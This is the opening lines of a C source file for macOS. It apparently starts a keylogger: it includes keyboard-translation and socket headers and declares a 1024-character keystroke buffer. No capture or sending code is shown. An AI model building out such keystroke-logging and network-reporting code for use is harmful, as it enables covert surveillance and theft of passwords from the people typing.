#include <ApplicationServices/ApplicationServices.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>  // For sleep
#include <sys/socket.h>
#include <arpa/inet.h>
#include <Carbon/Carbon.h>  // For UCKeyTranslate and keyboard layout functions
// Buffer to store keystrokes
char keystroke_buffer[1024] = "";  // Buffer for 1024 characters
int buffer_pos = 0;